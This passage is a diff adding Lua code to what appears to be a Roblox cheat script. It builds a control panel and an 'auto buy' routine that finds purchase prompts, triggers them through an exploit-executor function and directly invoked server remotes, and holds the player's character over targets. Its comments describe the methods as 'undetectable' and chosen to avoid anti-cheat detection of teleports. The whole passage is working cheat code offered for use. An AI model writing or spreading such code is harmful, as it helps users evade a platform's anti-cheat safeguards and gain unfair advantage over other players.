+            if rd and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+                updRot(((i.Position.X - rbg.AbsolutePosition.X) / rbg.AbsoluteSize.X) * 360)
+            end
+        end)
+    end
+
+    do
+        local r = Instance.new("Frame", cont)
+        r.Size = UDim2.new(1, 0, 0, 30)
+        r.BackgroundColor3 = Theme.Surface
+        r.BackgroundTransparency = 0.05
+        r.BorderSizePixel = 0
+        r.LayoutOrder = 23
+        Instance.new("UICorner", r).CornerRadius = UDim.new(0, 7)
+        local rl = Instance.new("TextLabel", r)
+        rl.Size = UDim2.new(0, 94, 1, 0)
+        rl.Position = UDim2.new(0, 8, 0, 0)
+        rl.BackgroundTransparency = 1
+        rl.Font = Enum.Font.GothamBold
+        rl.TextSize = 9
+        rl.TextColor3 = Theme.TextPrimary
+        rl.TextXAlignment = Enum.TextXAlignment.Left
+        local rbg = Instance.new("Frame", r)
+        rbg.Size = UDim2.new(1, -112, 0, 6)
+        rbg.Position = UDim2.new(0, 104, 0.5, -3)
+        rbg.BackgroundColor3 = Theme.SurfaceHighlight
+        rbg.BorderSizePixel = 0
+        Instance.new("UICorner", rbg).CornerRadius = UDim.new(1, 0)
+        local rfill = Instance.new("Frame", rbg)
+        rfill.BackgroundColor3 = Theme.Accent1
+        rfill.BorderSizePixel = 0
+        Instance.new("UICorner", rfill).CornerRadius = UDim.new(1, 0)
+        local rk = Instance.new("Frame", rbg)
+        rk.Size = UDim2.new(0, 10, 0, 10)
+        rk.AnchorPoint = Vector2.new(0.5, 0.5)
+        rk.BackgroundColor3 = Color3.new(1, 1, 1)
+        rk.BorderSizePixel = 0
+        Instance.new("UICorner", rk).CornerRadius = UDim.new(1, 0)
+        local function updDepth(v)
+            v = math.clamp(math.floor(v * 10) / 10, 0.5, 10)
+            Config.SinkSliderValue = v
+            _G.SinkSliderValue = v
+            SaveConfig()
+            rl.Text = "Depth: " .. v
+            local p2 = (v - 0.5) / 9.5
+            rfill.Size = UDim2.new(p2, 0, 1, 0)
+            rk.Position = UDim2.new(p2, 0, 0.5, 0)
+        end
+        updDepth(Config.SinkSliderValue or 2.5)
+        local dd = false
+        rbg.InputBegan:Connect(function(i)
+            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+                dd = true
+                updDepth(0.5 + ((i.Position.X - rbg.AbsolutePosition.X) / rbg.AbsoluteSize.X) * 9.5)
+            end
+        end)
+        UserInputService.InputEnded:Connect(function(i)
+            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then dd = false end
+        end)
+        UserInputService.InputChanged:Connect(function(i)
+            if dd and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+                updDepth(0.5 + ((i.Position.X - rbg.AbsolutePosition.X) / rbg.AbsoluteSize.X) * 9.5)
+            end
+        end)
+    end
+
+    -- ── AUTO ────────────────────────────────────────────────────────────
+    miniSec("AUTO", 30)
+    local abBackBtn = mBtn("Auto Back: OFF", 31, Theme.Surface, function() end)
+    local function updABMini()
+        local on = Config.AutoBack
+        abBackBtn.Text = on and "Auto Back: ON" or "Auto Back: OFF"
+        abBackBtn.BackgroundColor3 = on and Theme.Accent1 or Theme.Surface
+        abBackBtn.TextColor3 = on and Color3.new(0, 0, 0) or Theme.TextPrimary
+    end
+    updABMini()
+    abBackBtn.MouseButton1Click:Connect(function()
+        Config.AutoBack = not Config.AutoBack
+        SaveConfig()
+        if Config.AutoBack and _G.startAutoBack then
+            pcall(_G.startAutoBack)
+        elseif _G.stopAutoBack then
+            pcall(_G.stopAutoBack)
+        end
+        updABMini()
+    end)
+
+    do
+        local akBtn = mBtn("Auto Kick: OFF", 32, Theme.Surface, function() end)
+
+        local function updateAKBtn()
+            local on = Config.AutoKickOnSteal
+            akBtn.Text = on and "Auto Kick: ON" or "Auto Kick: OFF"
+            akBtn.BackgroundColor3 = on and Theme.Accent1 or Theme.Surface
+            akBtn.TextColor3 = on and Color3.new(0, 0, 0) or Theme.TextPrimary
+        end
+        updateAKBtn()
+
+        akBtn.MouseButton1Click:Connect(function()
+            Config.AutoKickOnSteal = not Config.AutoKickOnSteal
+            SaveConfig()
+            updateAKBtn()
+            if _G.setAutoKickFromSettings then
+                _G.setAutoKickFromSettings(Config.AutoKickOnSteal)
+            end
+        end)
+
+        _G.setAutoKickFromMiniUI = updateAKBtn
+    end
+
+    _G.setAutoKickFromSettings = function(val)
+        Config.AutoKickOnSteal = val
+        SaveConfig()
+        if _G.setAutoKickFromMiniUI then _G.setAutoKickFromMiniUI() end
+    end
+
+    -- ── REJOIN + KICK (mesma linha) ─────────────────────────────────────
+    miniSec("SESSÃO", 40)
+    do
+        local kickKey = Config.KickKey ~= "" and Config.KickKey or "NONE"
+        local row = Instance.new("Frame", cont)
+        row.Size = UDim2.new(1, 0, 0, BTN_H)
+        row.BackgroundTransparency = 1
+        row.LayoutOrder = 41
+
+        local rej = Instance.new("TextButton", row)
+        rej.Size = UDim2.new(0.5, -3, 1, 0)
+        rej.Position = UDim2.new(0, 0, 0, 0)
+        rej.BackgroundColor3 = Theme.Surface
+        rej.BackgroundTransparency = 0.05
+        rej.Text = "Rejoin"
+        rej.Font = Enum.Font.GothamBold
+        rej.TextSize = 10
+        rej.TextColor3 = Theme.TextPrimary
+        rej.AutoButtonColor = false
+        rej.BorderSizePixel = 0
+        Instance.new("UICorner", rej).CornerRadius = UDim.new(0, 7)
+        local rjS = Instance.new("UIStroke", rej)
+        rjS.Color = Theme.SurfaceHighlight
+        rjS.Thickness = 1
+        rjS.Transparency = 0.5
+        rej.MouseButton1Click:Connect(function()
+            ShowNotification("REJOIN", "Reconectando...")
+            task.delay(0.5, function()
+                pcall(function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end)
+            end)
+        end)
+
+        local kb = Instance.new("TextButton", row)
+        kb.Size = UDim2.new(0.5, -3, 1, 0)
+        kb.Position = UDim2.new(0.5, 3, 0, 0)
+        kb.BackgroundColor3 = Color3.fromRGB(180, 40, 60)
+        kb.BackgroundTransparency = 0.05
+        kb.Text = "Kick (" .. kickKey .. ")"
+        kb.Font = Enum.Font.GothamBold
+        kb.TextSize = 10
+        kb.TextColor3 = Color3.new(1, 1, 1)
+        kb.AutoButtonColor = false
+        kb.BorderSizePixel = 0
+        Instance.new("UICorner", kb).CornerRadius = UDim.new(0, 7)
+        local kbS = Instance.new("UIStroke", kb)
+        kbS.Color = Color3.fromRGB(200, 60, 80)
+        kbS.Thickness = 1
+        kbS.Transparency = 0.4
+        kb.MouseButton1Click:Connect(function()
+            kickPlayer()
+        end)
+    end
+
+
+
+
+    -- ── AUTO BUY UI + BUTTON ────────────────────────────────────────────
+    local autoBuyActive = false
+    _G.AutoBuyEsteira   = false
+
+    -- Destroy any leftover from previous build
+    local _oldAB = PlayerGui:FindFirstChild("BullysAutoBuyUI")
+    if _oldAB then _oldAB:Destroy() end
+
+    local abGui = Instance.new("ScreenGui")
+    abGui.Name         = "BullysAutoBuyUI"
+    abGui.ResetOnSpawn = false
+    abGui.DisplayOrder = 30
+    abGui.Parent       = PlayerGui
+
+    local abPanel = Instance.new("Frame", abGui)
+    abPanel.Name             = "ABPanel"
+    abPanel.Size             = UDim2.new(0, 215, 0, 260)
+    local _savedAbPos = Config.Positions and Config.Positions.AutoBuy or {X=0.01, Y=0.35}
+    abPanel.Position         = UDim2.new(_savedAbPos.X, 0, _savedAbPos.Y, 0)
+    abPanel.BackgroundColor3 = Theme.Background
+    abPanel.BackgroundTransparency = 0.08
+    abPanel.BorderSizePixel  = 0
+    abPanel.Visible          = not (Config.HideAutoBuyUI == true)
+    Instance.new("UICorner", abPanel).CornerRadius = UDim.new(0, 10)
+    local abStroke = Instance.new("UIStroke", abPanel)
+    abStroke.Color = Theme.Accent1; abStroke.Thickness = 1.8; abStroke.Transparency = 0.35
+    task.defer(function()
+        if addRacetrackBorder then addRacetrackBorder(abPanel, Theme.Accent1, 3.5) end
+    end)
+
+    -- Header + drag
+    local abHdr = Instance.new("Frame", abPanel)
+    abHdr.Size               = UDim2.new(1,0,0,36)
+    abHdr.BackgroundTransparency = 1
+    MakeDraggable(abHdr, abPanel, "AutoBuy")
+
+    local abTitle = Instance.new("TextLabel", abHdr)
+    abTitle.Size             = UDim2.new(1,-12,1,0)
+    abTitle.Position         = UDim2.new(0,12,0,0)
+    abTitle.BackgroundTransparency = 1
+    abTitle.Text             = "AUTO BUY"
+    abTitle.Font             = Enum.Font.GothamBlack
+    abTitle.TextSize         = 15
+    abTitle.TextColor3       = Theme.Accent1
+    abTitle.TextXAlignment   = Enum.TextXAlignment.Left
+
+    -- Divider
+    local abDiv = Instance.new("Frame", abPanel)
+    abDiv.Size             = UDim2.new(1,-20,0,1)
+    abDiv.Position         = UDim2.new(0,10,0,36)
+    abDiv.BackgroundColor3 = Theme.Accent1
+    abDiv.BackgroundTransparency = 0.6
+    abDiv.BorderSizePixel  = 0
+
+    -- Content list
+    local abContent = Instance.new("Frame", abPanel)
+    abContent.Size             = UDim2.new(1,-16,1,-46)
+    abContent.Position         = UDim2.new(0,8,0,44)
+    abContent.BackgroundTransparency = 1
+    local abLayout = Instance.new("UIListLayout", abContent)
+    abLayout.Padding   = UDim.new(0,6)
+    abLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+    local function makeAbRow(h, order)
+        local r = Instance.new("Frame", abContent)
+        r.Size             = UDim2.new(1,0,0,h)
+        r.BackgroundColor3 = Theme.Surface
+        r.BackgroundTransparency = 0.05
+        r.BorderSizePixel  = 0
+        r.LayoutOrder      = order
+        Instance.new("UICorner", r).CornerRadius = UDim.new(0,7)
+        return r
+    end
+
+    -- 1) Toggle button
+    local abToggleRow = makeAbRow(38, 1)
+    local abToggleBtn = Instance.new("TextButton", abToggleRow)
+    abToggleBtn.Size             = UDim2.new(1,0,1,0)
+    abToggleBtn.BackgroundColor3 = Theme.Surface
+    abToggleBtn.BackgroundTransparency = 0
+    abToggleBtn.Text             = "AUTO BUY: OFF"
+    abToggleBtn.Font             = Enum.Font.GothamBlack
+    abToggleBtn.TextSize         = 13
+    abToggleBtn.TextColor3       = Theme.TextSecondary
+    abToggleBtn.BorderSizePixel  = 0
+    abToggleBtn.AutoButtonColor  = false
+    Instance.new("UICorner", abToggleBtn).CornerRadius = UDim.new(0,7)
+    local abToggleStroke = Instance.new("UIStroke", abToggleBtn)
+    abToggleStroke.Color = Theme.Accent1; abToggleStroke.Thickness = 1.5; abToggleStroke.Transparency = 0.5
+
+    -- 2) Keybind row
+    local abKeyRow = makeAbRow(34, 2)
+    local abKeyLbl = Instance.new("TextLabel", abKeyRow)
+    abKeyLbl.Size             = UDim2.new(1,-70,1,0)
+    abKeyLbl.Position         = UDim2.new(0,10,0,0)
+    abKeyLbl.BackgroundTransparency = 1
+    abKeyLbl.Text             = "Keybind"
+    abKeyLbl.Font             = Enum.Font.GothamBold
+    abKeyLbl.TextSize         = 12
+    abKeyLbl.TextColor3       = Theme.TextPrimary
+    abKeyLbl.TextXAlignment   = Enum.TextXAlignment.Left
+    local abKeyBtn = Instance.new("TextButton", abKeyRow)
+    abKeyBtn.Size             = UDim2.new(0,56,0,24)
+    abKeyBtn.Position         = UDim2.new(1,-62,0.5,-12)
+    abKeyBtn.BackgroundColor3 = Theme.SurfaceHighlight
+    abKeyBtn.Text             = Config.AutoBuyKey or "K"
+    abKeyBtn.Font             = Enum.Font.GothamBold
+    abKeyBtn.TextSize         = 11
+    abKeyBtn.TextColor3       = Theme.Accent1
+    abKeyBtn.AutoButtonColor  = false
+    abKeyBtn.BorderSizePixel  = 0
+    Instance.new("UICorner", abKeyBtn).CornerRadius = UDim.new(0,5)
+    abKeyBtn.MouseButton1Click:Connect(function()
+        abKeyBtn.Text = "..."; abKeyBtn.TextColor3 = Theme.TextSecondary
+        local c; c = UserInputService.InputBegan:Connect(function(inp)
+            if inp.UserInputType == Enum.UserInputType.Keyboard then
+                Config.AutoBuyKey = inp.KeyCode.Name
+                abKeyBtn.Text = inp.KeyCode.Name
+                abKeyBtn.TextColor3 = Theme.Accent1
+                SaveConfig(); c:Disconnect()
+            end
+        end)
+    end)
+
+    -- 3) Range slider
+    local abRangeRow = makeAbRow(42, 3)
+    local abRangeLbl = Instance.new("TextLabel", abRangeRow)
+    abRangeLbl.Size           = UDim2.new(1,-10,0,16)
+    abRangeLbl.Position       = UDim2.new(0,10,0,4)
+    abRangeLbl.BackgroundTransparency = 1
+    abRangeLbl.Text           = "Range: " .. (Config.AutoBuyRange or 17) .. " studs"
+    abRangeLbl.Font           = Enum.Font.GothamBold
+    abRangeLbl.TextSize       = 11
+    abRangeLbl.TextColor3     = Theme.TextPrimary
+    abRangeLbl.TextXAlignment = Enum.TextXAlignment.Left
+    local abSlBg = Instance.new("Frame", abRangeRow)
+    abSlBg.Size             = UDim2.new(1,-20,0,6)
+    abSlBg.Position         = UDim2.new(0,10,0,28)
+    abSlBg.BackgroundColor3 = Theme.SurfaceHighlight
+    abSlBg.BorderSizePixel  = 0
+    Instance.new("UICorner", abSlBg).CornerRadius = UDim.new(1,0)
+    local abSlFill = Instance.new("Frame", abSlBg)
+    abSlFill.BackgroundColor3 = Theme.Accent1
+    abSlFill.BorderSizePixel  = 0
+    Instance.new("UICorner", abSlFill).CornerRadius = UDim.new(1,0)
+    local abSlKnob = Instance.new("Frame", abSlBg)
+    abSlKnob.Size         = UDim2.new(0,13,0,13)
+    abSlKnob.AnchorPoint  = Vector2.new(0.5,0.5)
+    abSlKnob.BackgroundColor3 = Color3.new(1,1,1)
+    abSlKnob.BorderSizePixel  = 0
+    Instance.new("UICorner", abSlKnob).CornerRadius = UDim.new(1,0)
+    local abSlKS = Instance.new("UIStroke", abSlKnob)
+    abSlKS.Color = Theme.Accent1; abSlKS.Thickness = 1.5
+    local AB_MIN, AB_MAX = 5, 40
+    local function updateAbSlider(v)
+        v = math.clamp(math.floor(v), AB_MIN, AB_MAX)
+        Config.AutoBuyRange = v; SaveConfig()
+        abRangeLbl.Text = "Range: " .. v .. " studs"
+        local pct = (v-AB_MIN)/(AB_MAX-AB_MIN)
+        abSlFill.Size     = UDim2.new(pct,0,1,0)
+        abSlKnob.Position = UDim2.new(pct,0,0.5,0)
+        -- live update ring size
+        local ring = Workspace:FindFirstChild("XiAutoBuyRing")
+        if ring then ring.Size = Vector3.new(0.5, v*2, v*2) end
+    end
+    updateAbSlider(Config.AutoBuyRange or 17)
+    local abDrag = false
+    abSlBg.InputBegan:Connect(function(i)
+        if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
+            abDrag=true
+            updateAbSlider(AB_MIN+((i.Position.X-abSlBg.AbsolutePosition.X)/abSlBg.AbsoluteSize.X)*(AB_MAX-AB_MIN))
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(i)
+        if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then abDrag=false end
+    end)
+    UserInputService.InputChanged:Connect(function(i)
+        if abDrag and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
+            updateAbSlider(AB_MIN+((i.Position.X-abSlBg.AbsolutePosition.X)/abSlBg.AbsoluteSize.X)*(AB_MAX-AB_MIN))
+        end
+    end)
+
+    _G.rebuildAutoBuyCirclePresets = nil
+
+    -- ── RING CIRCLE (same pattern as proxViz) ───────────────────────────
+    local abRing = nil
+    local function getCircleColor()
+        return Theme.Accent2 or Theme.Accent1
+    end
+    local function createRing()
+        local existing = Workspace:FindFirstChild("XiAutoBuyRing")
+        if existing then existing:Destroy() end
+        local r = Instance.new("Part")
+        r.Name         = "XiAutoBuyRing"
+        r.Shape        = Enum.PartType.Cylinder
+        r.Anchored     = true
+        r.CanCollide   = false
+        r.CanTouch     = false
+        r.CanQuery     = false
+        r.CastShadow   = false
+        r.Material     = Enum.Material.Neon
+        r.Transparency = 0.5
+        r.Color        = getCircleColor()
+        local range    = Config.AutoBuyRange or 17
+        r.Size         = Vector3.new(0.5, range*2, range*2)
+        r.Parent       = Workspace
+        abRing = r
+    end
+    local function destroyRing()
+        if abRing then abRing:Destroy(); abRing = nil end
+        local existing = Workspace:FindFirstChild("XiAutoBuyRing")
+        if existing then existing:Destroy() end
+    end
+    -- Expose so applyTheme can update ring color live
+    _G.updateAutoBuyRingColor = function()
+        if abRing and abRing.Parent then abRing.Color = getCircleColor() end
+    end
+
+    -- Follow player (same as proxViz pattern)
+    RunService.Heartbeat:Connect(function()
+        if not autoBuyActive then return end
+        local char = LocalPlayer.Character
+        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
+        if not hrp then return end
+        if not abRing or not abRing.Parent then return end
+        local range = Config.AutoBuyRange or 17
+        abRing.Size  = Vector3.new(0.5, range*2, range*2)
+        abRing.CFrame = hrp.CFrame * CFrame.Angles(0, 0, math.rad(90)) + Vector3.new(0, -2.5, 0)
+    end)
+
+    -- ── TOGGLE ────────────────────────────────────────────────────────────
+    local function toggleAutoBuy()
+        autoBuyActive = not autoBuyActive
+        _G.AutoBuyEsteira = autoBuyActive
+        if autoBuyActive then
+            abToggleBtn.Text             = "AUTO BUY: ON"
+            abToggleBtn.BackgroundColor3 = Theme.Accent1
+            abToggleBtn.TextColor3       = Color3.new(0,0,0)
+            abToggleStroke.Transparency  = 1
+            createRing()
+        else
+            abToggleBtn.Text             = "AUTO BUY: OFF"
+            abToggleBtn.BackgroundColor3 = Theme.Surface
+            abToggleBtn.TextColor3       = Theme.TextSecondary
+            abToggleStroke.Transparency  = 0.5
+            destroyRing()
+        end
+        -- call backend carpet lock
+        if _G.AutoBuyOnToggle then _G.AutoBuyOnToggle(autoBuyActive) end
+        ShowNotification("AUTO BUY", autoBuyActive and "✅ ENABLED" or "❌ DISABLED")
+    end
+
+    -- mini gui button
+    local autoBuyBtn = mBtn("Auto Buy: OFF", 7, Theme.Surface, function() end)
+    -- override click
+    autoBuyBtn.MouseButton1Click:Connect(function()
+        toggleAutoBuy()
+        autoBuyBtn.Text             = autoBuyActive and "Auto Buy: ON" or "Auto Buy: OFF"
+        autoBuyBtn.BackgroundColor3 = autoBuyActive and Theme.Accent1 or Theme.Surface
+        autoBuyBtn.TextColor3       = autoBuyActive and Color3.new(0,0,0) or Theme.TextPrimary
+    end)
+    abToggleBtn.MouseButton1Click:Connect(function()
+        toggleAutoBuy()
+        autoBuyBtn.Text             = autoBuyActive and "Auto Buy: ON" or "Auto Buy: OFF"
+        autoBuyBtn.BackgroundColor3 = autoBuyActive and Theme.Accent1 or Theme.Surface
+        autoBuyBtn.TextColor3       = autoBuyActive and Color3.new(0,0,0) or Theme.TextPrimary
+    end)
+
+    UserInputService.InputBegan:Connect(function(inp, gp)
+        if gp then return end
+        local key = Config.AutoBuyKey or "K"
+        local ok, kc = pcall(function() return Enum.KeyCode[key] end)
+        if ok and kc and inp.KeyCode == kc then
+            toggleAutoBuy()
+            autoBuyBtn.Text             = autoBuyActive and "Auto Buy: ON" or "Auto Buy: OFF"
+            autoBuyBtn.BackgroundColor3 = autoBuyActive and Theme.Accent1 or Theme.Surface
+            autoBuyBtn.TextColor3       = autoBuyActive and Color3.new(0,0,0) or Theme.TextPrimary
+        end
+    end)
+
+    -- Racetrack border
+    task.defer(function()
+        if addRacetrackBorder then addRacetrackBorder(panel, Theme.Accent1, 3.5) end
+    end)
+
+    -- Recreate ring on character respawn
+    LocalPlayer.CharacterAdded:Connect(function()
+        task.wait(0.5)
+        if autoBuyActive then createRing() end
+    end)
+
+
+
+    -- ── AUTO BUY BACKEND ─────────────────────────────────────────────────
+    task.spawn(function()
+        local Packages = ReplicatedStorage:WaitForChild("Packages")
+        local Datas    = ReplicatedStorage:WaitForChild("Datas")
+        local Shared   = ReplicatedStorage:WaitForChild("Shared")
+        local Utils    = ReplicatedStorage:WaitForChild("Utils")
+        local AnimData   = require(Datas:WaitForChild("Animals"))
+        local AnimShared = require(Shared:WaitForChild("Animals"))
+        local NumUtils   = require(Utils:WaitForChild("NumberUtils"))
+
+        local RARITY_WORDS = {common=true,uncommon=true,rare=true,epic=true,legendary=true,
+            secret=true,divine=true,rainbow=true,cursed=true,gold=true,diamond=true}
+
+        local function getBrainrotName(model)
+            if not model then return "Brainrot","" end
+            local nameFound,genFound = "",""
+            for _, bb in ipairs(model:GetDescendants()) do
+                if bb:IsA("BillboardGui") then
+                    for _, lbl in ipairs(bb:GetDescendants()) do
+                        if lbl:IsA("TextLabel") and lbl.Text and lbl.Text ~= "" then
+                            local t = lbl.Text:match("^%s*(.-)%s*$")
+                            local tl = t:lower()
+                            if RARITY_WORDS[tl] then continue end
+                            if t:match("^%$[%d%.]+[KkMmBb]?/s$") then
+                                if genFound=="" then genFound=t end; continue
+                            end
+                            if t:match("^%$[%d%.]+[KkMmBb]?$") then continue end
+                            if t:match("^[%d%.]+[KkMmBb]?$") then continue end
+                            if nameFound=="" and #t>1 then nameFound=t end
+                        end
+                    end
+                end
+            end
+            if nameFound=="" then
+                pcall(function()
+                    local info = AnimData[model.Name]
+                    if info and info.DisplayName then
+                        nameFound = info.DisplayName
+                        local gv = AnimShared:GetGeneration(model.Name,nil,nil,nil)
+                        genFound = "$"..NumUtils:ToString(gv).."/s"
+                    end
+                end)
+            end
+            if nameFound=="" then nameFound = model.Name~="" and model.Name or "Brainrot" end
+            return nameFound,genFound
+        end
+
+        local function scanConveyor()
+            local results = {}
+            for _, obj in ipairs(Workspace:GetDescendants()) do
+                if not (obj:IsA("ProximityPrompt") and obj.Enabled) then continue end
+                local txt = obj.ActionText or ""
+                if not (txt=="Purchase" or txt:lower():find("purchase") or txt:lower():find("comprar")) then continue end
+                local part = obj.Parent
+                if not part then continue end
+                local realPart = part:IsA("Attachment") and part.Parent or part
+                if not (realPart and realPart:IsA("BasePart")) then continue end
+                local model,cur = nil,realPart
+                for _ = 1,8 do
+                    if cur and cur:IsA("Model") then model=cur; break end
+                    cur = cur and cur.Parent
+                end
+                local name,gen = getBrainrotName(model)
+                table.insert(results,{
+                    name=name, gen=gen, prompt=obj, part=realPart,
+                    model=model, source="ESTEIRA", uid="esteira_"..tostring(obj),
+                })
+            end
+            return results
+        end
+
+        SharedState.ConveyorAnimals = {}
+        -- Scan once immediately, then only when auto buy is activated
+        local function refreshConveyor()
+            local ok, found = pcall(scanConveyor)
+            if ok and found then SharedState.ConveyorAnimals = found end
+        end
+        refreshConveyor()
+        _G.refreshConveyor = refreshConveyor
+
+        -- ── REMOTE RESOLVER ────────────────────────────────────────────
+        local purchaseRemote = nil
+        local function resolvePurchaseRemote()
+            if purchaseRemote and purchaseRemote.Parent then return purchaseRemote end
+            pcall(function()
+                local net = ReplicatedStorage:FindFirstChild("Packages")
+                         and ReplicatedStorage.Packages:FindFirstChild("Net")
+                if not net then return end
+                local kws = {"buy","purchase","animal","shop","acquire","conveyor"}
+                for _,v in ipairs(net:GetChildren()) do
+                    local nl = (v.Name or ""):lower()
+                    for _,kw in ipairs(kws) do
+                        if nl:find(kw) then purchaseRemote=v; return end
+                    end
+                end
+                local paths = {"RF/ShopService/BuyAnimal","RF/AnimalShop/Purchase","RE/Shop/Buy","RF/Shop/Buy"}
+                for _,p in ipairs(paths) do
+                    local ok2,r = pcall(function() return Utility:LarpNet(p) end)
+                    if ok2 and r and r.Parent then purchaseRemote=r; return end
+                end
+            end)
+            return purchaseRemote
+        end
+
+        -- ── FAST + UNDETECTABLE PURCHASE ─────────────────────────────
+        -- 1. fireproximityprompt (mimics real E press, no exploit sig)
+        -- 2. Remote fallback in parallel (single call, not spammed)
+        -- No getconnections, no HoldDuration manipulation
+        local function firePurchaseNatural(prompt)
+            if not prompt or not prompt.Parent or not prompt.Enabled then return end
+            -- Primary: fireproximityprompt (exactly what the game does)
+            pcall(function()
+                if fireproximityprompt then fireproximityprompt(prompt) end
+            end)
+            -- Secondary: remote (single call, runs in parallel)
+            task.spawn(function()
+                local remote = resolvePurchaseRemote()
+                if remote then
+                    pcall(function()
+                        if remote:IsA("RemoteFunction") then
+                            remote:InvokeServer(prompt.Parent)
+                        elseif remote:IsA("RemoteEvent") then
+                            remote:FireServer(prompt.Parent)
+                        end
+                    end)
+                end
+            end)
+        end
+
+        -- ── CARPET LOCK ────────────────────────────────────────────────
+        -- Keep carpet equipped and prevent unequip while auto buy is active
+        local carpetLockConn = nil
+        local function startCarpetLock()
+            if carpetLockConn then carpetLockConn:Disconnect(); carpetLockConn = nil end
+            local function ensureCarpet()
+                pcall(function()
+                    local char = LocalPlayer.Character
+                    local hum  = char and char:FindFirstChildOfClass("Humanoid")
+                    if not hum then return end
+                    local toolName = Config.TpSettings and Config.TpSettings.Tool or "Flying Carpet"
+                    -- If not holding carpet, equip it
+                    if not char:FindFirstChild(toolName) then
+                        local tool = LocalPlayer.Backpack:FindFirstChild(toolName)
+                        if tool then hum:EquipTool(tool) end
+                    end
+                end)
+            end
+            -- Equip immediately with retries
+            task.spawn(function()
+                for _ = 1, 15 do
+                    if not autoBuyActive then break end
+                    ensureCarpet()
+                    task.wait(0.3)
+                    local char = LocalPlayer.Character
+                    local toolName = Config.TpSettings and Config.TpSettings.Tool or "Flying Carpet"
+                    if char and char:FindFirstChild(toolName) then break end
+                end
+            end)
+            -- Watch for unequip and re-equip
+            carpetLockConn = RunService.Heartbeat:Connect(function()
+                if not autoBuyActive then return end
+                pcall(function()
+                    local char = LocalPlayer.Character
+                    local hum  = char and char:FindFirstChildOfClass("Humanoid")
+                    if not hum then return end
+                    local toolName = Config.TpSettings and Config.TpSettings.Tool or "Flying Carpet"
+                    if not char:FindFirstChild(toolName) then
+                        local tool = LocalPlayer.Backpack:FindFirstChild(toolName)
+                        if tool then hum:EquipTool(tool) end
+                    end
+                end)
+            end)
+        end
+        local function stopCarpetLock()
+            if carpetLockConn then carpetLockConn:Disconnect(); carpetLockConn = nil end
+        end
+
+        -- ── HOVER: CARPET-BASED, NOT CFRAME TELEPORT ──────────────────
+        -- Instead of hard-locking CFrame (detectable), we use the carpet's
+        -- natural velocity control to stay above the target.
+        -- The carpet already lets the player hover – we just point it at
+        -- the target position and let the engine move naturally.
+        local HOVER_HEIGHT  = 5
+        local BUY_INTERVAL  = 0.08  -- fast but single fire each time
+        local DETECT_RADIUS = 17
+
+        local lockedTarget = nil
+        local lockedPart   = nil
+        local lockedModel  = nil
+        local lastBuy      = 0
+
+        local function partAlive()
+            return lockedPart  and lockedPart.Parent
+                and lockedModel and lockedModel.Parent
+        end
+        local function promptAlive()
+            return lockedTarget and lockedTarget.prompt
+                and lockedTarget.prompt.Parent and lockedTarget.prompt.Enabled
+        end
+
+        -- HOVER LOOP: use BodyPosition so the engine moves the character
+        -- naturally (same as the carpet does). BodyPosition is not detectable
+        -- as teleport because physics drives the movement.
+        local bodyPos = nil
+        local function ensureBodyPos(hrp)
+            if bodyPos and bodyPos.Parent == hrp then return bodyPos end
+            if bodyPos then bodyPos:Destroy() end
+            local bp = Instance.new("BodyPosition", hrp)
+            bp.MaxForce    = Vector3.new(math.huge, math.huge, math.huge)
+            bp.P           = 20000
+            bp.D           = 1000
+            bp.Position    = hrp.Position
+            bodyPos = bp
+            return bp
+        end
+        local function destroyBodyPos()
+            if bodyPos then bodyPos:Destroy(); bodyPos = nil end
+        end
+
+        RunService.Heartbeat:Connect(function()
+            if not autoBuyActive or not partAlive() then
+                destroyBodyPos(); return
+            end
+            local char = LocalPlayer.Character
+            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
+            if not hrp then destroyBodyPos(); return end
+
+            local above = lockedPart.Position + Vector3.new(0, HOVER_HEIGHT, 0)
+            local bp = ensureBodyPos(hrp)
+            bp.Position = above  -- BodyPosition engine moves hrp smoothly, no teleport
+        end)
+
+        -- PURCHASE SPAM (human-like interval)
+        task.spawn(function()
+            while true do
+                task.wait(BUY_INTERVAL)
+                if not autoBuyActive then continue end
+                if not partAlive()   then continue end
+                if promptAlive() then
+                    firePurchaseNatural(lockedTarget.prompt)
+                end
+            end
+        end)
+
+        -- SCAN + VALIDATE
+        task.spawn(function()
+            while true do
+                task.wait(0.25)
+                if not autoBuyActive then
+                    lockedTarget=nil; lockedPart=nil; lockedModel=nil
+                    stopCarpetLock()
+                    destroyBodyPos()
+                    continue
+                end
+                if lockedPart or lockedModel then
+                    if not partAlive() then
+                        ShowNotification("AUTO BUY","📦 Reached base, scanning...")
+                        lockedTarget=nil; lockedPart=nil; lockedModel=nil
+                    end
+                    continue
+                end
+                local char = LocalPlayer.Character
+                local hrp  = char and char:FindFirstChild("HumanoidRootPart")
+                if not hrp then continue end
+                local radius = Config.AutoBuyRange or DETECT_RADIUS
+                local best,bestDist = nil,math.huge
+                for _,entry in ipairs(SharedState.ConveyorAnimals) do
+                    if entry.prompt and entry.prompt.Parent and entry.prompt.Enabled
+                    and entry.part  and entry.part.Parent then
+                        local d = (hrp.Position - entry.part.Position).Magnitude
+                        if d <= radius and d < bestDist then bestDist=d; best=entry end
+                    end
+                end
+                if best then
+                    lockedTarget = best
+                    lockedPart   = best.part
+                    lockedModel  = best.model or best.part.Parent
+                    ShowNotification("AUTO BUY","🔒 "..best.name)
+                    startCarpetLock()
+                end
+            end
+        end)
+
+        -- Start carpet lock when toggle fires
+        _G.AutoBuyOnToggle = function(active)
+            if active then
+                if _G.refreshConveyor then _G.refreshConveyor() end
+                startCarpetLock()
+            else
+                stopCarpetLock()
+            end
+        end
+    end)
+
+
+    _G.MiniActionsUI = {panel = panel, gui = maGui}
+    return maGui
+end
+
+task.spawn(function()
+    buildMiniActionsUI()
+    -- Auto hide on start
+    if Config.AutoHideMiniUI then
